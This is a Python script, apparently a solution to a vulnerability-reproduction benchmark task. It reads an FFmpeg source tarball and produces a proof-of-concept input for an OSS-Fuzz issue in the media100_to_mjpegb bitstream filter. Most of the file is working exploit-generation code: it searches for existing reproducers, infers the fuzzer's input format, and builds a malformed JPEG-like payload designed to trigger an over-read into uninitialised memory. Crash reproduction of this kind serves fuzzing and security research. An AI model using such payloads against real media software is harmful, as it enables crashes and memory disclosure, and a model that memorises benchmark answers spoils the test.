import os
import re
import tarfile
from typing import Optional, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                # Try to directly find a PoC in the tarball if it exists
                poc_bytes = self._find_existing_poc(tar)
                if poc_bytes is not None:
                    return poc_bytes

                # Try to detect the fuzz target input format
                bsf_fuzzer_content = self._read_text_file_from_tar(
                    tar,
                    [
                        "tools/target/bsf_fuzzer.c",
                        "tools/target/ffmpeg/bsf_fuzzer.c",
                        "fftools/target/bsf_fuzzer.c",
                        "fuzz/bsf_fuzzer.c",
                        "tests/fuzz/bsf_fuzzer.c",
                    ],
                )

                # Generate PoC based on fuzzer input format
                if bsf_fuzzer_content:
                    mode = self._detect_bsf_fuzzer_mode(bsf_fuzzer_content)
                    if mode == "name":
                        # Likely format: NUL-terminated BSF name string, followed by packet bytes
                        name = b"media100_to_mjpegb\x00"
                        payload_len = max(1025 - len(name), 1)
                        payload = self._construct_media100_like_payload(payload_len)
                        return name + payload
                    elif mode == "index":
                        # Likely format: first byte (or 32-bit) selects BSF index, rest is data
                        index_byte = self._compute_bsf_index_byte(tar)
                        if index_byte is None:
                            # Fallback: heuristic index (0), then payload
                            index_byte = 0
                        payload_len = max(1025 - 1, 1)
                        payload = self._construct_media100_like_payload(payload_len)
                        return bytes([index_byte]) + payload

                # If no fuzzer detected, fallback to a generic format that often works:
                # Try name-based selection: "media100_to_mjpegb\0" + payload
                name = b"media100_to_mjpegb\x00"
                payload_len = max(1025 - len(name), 1)
                payload = self._construct_media100_like_payload(payload_len)
                return name + payload
        except Exception:
            # As ultimate fallback, return a compact generic payload trying name mode
            name = b"media100_to_mjpegb\x00"
            payload_len = max(1025 - len(name), 1)
            return name + b"\x00" * payload_len

    def _find_existing_poc(self, tar: tarfile.TarFile) -> Optional[bytes]:
        # Look for any embedded PoC files in tar
        # Prioritize files referencing the oss-fuzz issue or bsf fuzzer
        name_patterns = [
            "42537583",
            "clusterfuzz",
            "minimized",
            "reproducer",
            "poc",
            "testcase",
            "bsf",
            "media100",
            "mjpegb",
        ]
        candidate_members: List[tarfile.TarInfo] = []
        for member in tar.getmembers():
            if not member.isreg():
                continue
            lname = member.name.lower()
            if any(p in lname for p in name_patterns):
                candidate_members.append(member)
        # Try to pick by more specific hints first
        candidate_members.sort(key=lambda m: (0 if "42537583" in m.name else 1,
                                              0 if "clusterfuzz" in m.name.lower() else 1,
                                              len(m.name)))
        for member in candidate_members:
            try:
                f = tar.extractfile(member)
                if not f:
                    continue
                data = f.read()
                # Heuristic: non-empty and reasonably sized
                if data and 16 <= len(data) <= 1_000_000:
                    return data
            except Exception:
                continue
        return None

    def _read_text_file_from_tar(self, tar: tarfile.TarFile, possible_paths: List[str]) -> Optional[str]:
        # Try exact paths
        for path in possible_paths:
            for member in tar.getmembers():
                if not member.isreg():
                    continue
                # match suffix end
                if member.name.endswith(path):
                    try:
                        f = tar.extractfile(member)
                        if not f:
                            continue
                        content = f.read()
                        try:
                            return content.decode("utf-8", errors="ignore")
                        except Exception:
                            pass
                    except Exception:
                        continue
        # Try fuzzy search by filename only
        filenames = [os.path.basename(p) for p in possible_paths]
        for member in tar.getmembers():
            if not member.isreg():
                continue
            base = os.path.basename(member.name)
            if base in filenames:
                try:
                    f = tar.extractfile(member)
                    if not f:
                        continue
                    content = f.read()
                    try:
                        return content.decode("utf-8", errors="ignore")
                    except Exception:
                        pass
                except Exception:
                    continue
        return None

    def _detect_bsf_fuzzer_mode(self, content: str) -> Optional[str]:
        # Heuristics to detect if fuzzer uses name-based or index-based selection
        # Name-based: av_bsf_get_by_name, strstr of names, NUL-terminated reading
        if "av_bsf_get_by_name" in content:
            return "name"
        # Index-based: data[0] % nb, or AV_RL32(data)
        # Look for pattern reading the first byte or first dword
        if re.search(r'\bdata\s*\[\s*0\s*\]', content) and re.search(r'%', content):
            return "index"
        if "AV_RL32(" in content or "AV_RB32(" in content or "AV_RN32(" in content:
            if re.search(r'idx|index|bsf', content):
                return "index"
        # Default to name; it's safer and common
        return "name"

    def _compute_bsf_index_byte(self, tar: tarfile.TarFile) -> Optional[int]:
        # Try to parse the static list of bsfs to compute the index of media100_to_mjpegb
        # Typical file is libavcodec/bsf_list.c or libavcodec/bitstream_filters.c
        candidates = []
        for member in tar.getmembers():
            if not member.isreg():
                continue
            lname = member.name.lower()
            if "libavcodec" in lname and ("bsf" in lname) and lname.endswith(".c"):
                candidates.append(member)
        # Try most promising filenames first
        candidates.sort(key=lambda m: (0 if "bsf_list" in m.name else 1,
                                       0 if "bitstream" in m.name else 1,
                                       len(m.name)))
        for member in candidates:
            try:
                f = tar.extractfile(member)
                if not f:
                    continue
                text = f.read().decode("utf-8", errors="ignore")
            except Exception:
                continue
            if "ff_media100_to_mjpegb_bsf" not in text:
                continue
            # Parse in-order occurrences of &ff_*_bsf or ff_*_bsf within initializer list
            # Collect matches in order
            entries = []
            # First try to extract within array initializers
            array_inits = re.finditer(r'=\s*\{([^}]*)\}', text, flags=re.S)
            found_any = False
            for init in array_inits:
                inside = init.group(1)
                matches = re.findall(r'&\s*ff_([A-Za-z0-9_]+)_bsf', inside)
                if matches:
                    found_any = True
                    entries.extend(matches)
            if not found_any:
                # fallback: match appearances in order in file
                matches = re.findall(r'ff_([A-Za-z0-9_]+)_bsf', text)
                if matches:
                    entries.extend(matches)
            if not entries:
                continue
            try:
                idx = entries.index("media100_to_mjpegb")
            except ValueError:
                continue
            # The fuzzer likely uses modulo of number of bsfs by number of entries.
            # If it uses data[0] % nb_bsf, then first byte should be idx.
            # Make sure idx in 0..255
            return idx % 256
        return None

    def _construct_media100_like_payload(self, length: int) -> bytes:
        # Construct a payload that has some JPEG-like markers and Media100-ish hints
        # to maximize the chance that the bsf produces output and downstream decoders
        # read past the end to hit uninitialized padding in vulnerable versions.
        # Layout:
        # - SOI
        # - APP1 "MEDIA100" marker
        # - DQT with minimal length
        # - SOF0 minimal
        # - DHT minimal
        # - SOS start of scan
        # - dummy scan data
        # - EOI
        # Fill remaining with zeroes.
        if length < 32:
            return b"\x00" * length
        parts = []
        # SOI
        parts.append(b"\xFF\xD8")
        # APP1 with "MEDIA100"
        app1_payload = b"MEDIA100" + b"\x00" * 6
        app1_len = 2 + len(app1_payload)
        parts.append(b"\xFF\xE1" + app1_len.to_bytes(2, "big") + app1_payload)
        # DQT
        dqt_table = b"\x00" + b"\x10" * 64
        dqt_len = 2 + len(dqt_table)
        parts.append(b"\xFF\xDB" + dqt_len.to_bytes(2, "big") + dqt_table)
        # SOF0
        sof0_body = b"\x08" + (16).to_bytes(2, "big") + (16).to_bytes(2, "big") + b"\x01" + b"\x01\x11\x00"
        sof0_len = 2 + len(sof0_body)
        parts.append(b"\xFF\xC0" + sof0_len.to_bytes(2, "big") + sof0_body)
        # DHT minimal
        dht_body = b"\x00" + b"\x00" * 16 + b"\x00"
        dht_len = 2 + len(dht_body)
        parts.append(b"\xFF\xC4" + dht_len.to_bytes(2, "big") + dht_body)
        # SOS
        sos_body = b"\x01" + b"\x01\x00" + b"\x00\x3F\x00"
        sos_len = 2 + len(sos_body)
        parts.append(b"\xFF\xDA" + sos_len.to_bytes(2, "big") + sos_body)
        data = b"".join(parts)
        # Dummy scan data; ensure we have space for EOI and padding
        remaining = max(length - len(data) - 2, 0)
        # Insert some 0xFF bytes to trigger overread patterns common in JPEG bitreaders
        scan = (b"\xFF" * min(16, remaining)) + b"\x00" * max(remaining - 16, 0)
        data += scan
        # EOI
        data += b"\xFF\xD9"
        if len(data) < length:
            data += b"\x00" * (length - len(data))
        return data[:length]
